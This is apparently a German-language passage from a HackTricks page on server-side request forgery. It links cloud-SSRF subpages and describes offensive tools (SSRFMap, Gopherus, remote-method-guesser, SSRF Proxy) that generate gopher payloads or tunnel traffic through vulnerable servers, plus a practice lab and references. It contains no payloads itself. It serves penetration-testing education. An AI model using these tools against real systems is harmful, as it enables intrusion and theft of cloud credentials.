Wenn du eine SSRF-Schwachstelle in einer Maschine findest, die in einer Cloud-Umgebung läuft, kannst du möglicherweise interessante Informationen über die Cloud-Umgebung und sogar Anmeldeinformationen erhalten:


{{#ref}}
cloud-ssrf.md
{{#endref}}

## Plattformen mit SSRF-Schwachstellen

Mehrere bekannte Plattformen enthalten oder enthielten SSRF-Schwachstellen, prüfe sie hier:


{{#ref}}
ssrf-vulnerable-platforms.md
{{#endref}}

## Tools

### [**SSRFMap**](https://github.com/swisskyrepo/SSRFmap)

Tool zur Erkennung und Ausnutzung von SSRF-Schwachstellen

### [Gopherus](https://github.com/tarunkant/Gopherus)

- [Blog post on Gopherus](https://spyclub.tech/2018/08/14/2018-08-14-blog-on-gopherus/)

Dieses Tool generiert Gopher payloads für:

- MySQL
- PostgreSQL
- FastCGI
- Redis
- Zabbix
- Memcache

### [remote-method-guesser](https://github.com/qtc-de/remote-method-guesser)

- [Blog post on SSRF usage](https://blog.tneitzel.eu/posts/01-attacking-java-rmi-via-ssrf/)

_remote-method-guesser_ ist ein _Java RMI_-Schwachstellen-Scanner, der Angriffsoperationen für die gängigsten _Java RMI_-Schwachstellen unterstützt. Die meisten verfügbaren Operationen unterstützen die Option `--ssrf`, um eine _SSRF_ payload für die angeforderte Operation zu generieren. Zusammen mit der Option `--gopher` können direkt einsatzbereite _gopher_ payloads erzeugt werden.

### [SSRF Proxy](https://github.com/bcoles/ssrf_proxy)

SSRF Proxy ist ein mehrthreadiger HTTP-Proxy-Server, der dafür entwickelt wurde, Client-HTTP-Verkehr durch HTTP-Server zu tunneln, die für Server-Side Request Forgery (SSRF) verwundbar sind.

### Zum Üben


{{#ref}}
https://github.com/incredibleindishell/SSRF_Vulnerable_Lab
{{#endref}}

## References

- [https://medium.com/@pravinponnusamy/ssrf-payloads-f09b2a86a8b4](https://medium.com/@pravinponnusamy/ssrf-payloads-f09b2a86a8b4)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery)
- [https://www.invicti.com/blog/web-security/ssrf-vulnerabilities-caused-by-sni-proxy-misconfigurations/](https://www.invicti.com/blog/web-security/ssrf-vulnerabilities-caused-by-sni-proxy-misconfigurations/)
- [https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies](https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies)
- [Positive Technologies – Blind Trust: What Is Hidden Behind the Process of Creating Your PDF File?](https://swarm.ptsecurity.com/blind-trust-what-is-hidden-behind-the-process-of-creating-your-pdf-file/)
- [Tenable – SSRF Vulnerability in Java TLS Handshakes That Creates DoS Risk](https://www.tenable.com/blog/tenable-discovers-ssrf-vulnerability-in-java-tls-handshakes-that-creates-dos-risk)
- [RFC 5280 §4.2.2.1 Authority Information Access](https://datatracker.ietf.org/doc/html/rfc5280#section-4.2.2.1)

{{#include ../../banners/hacktricks-training.md}}
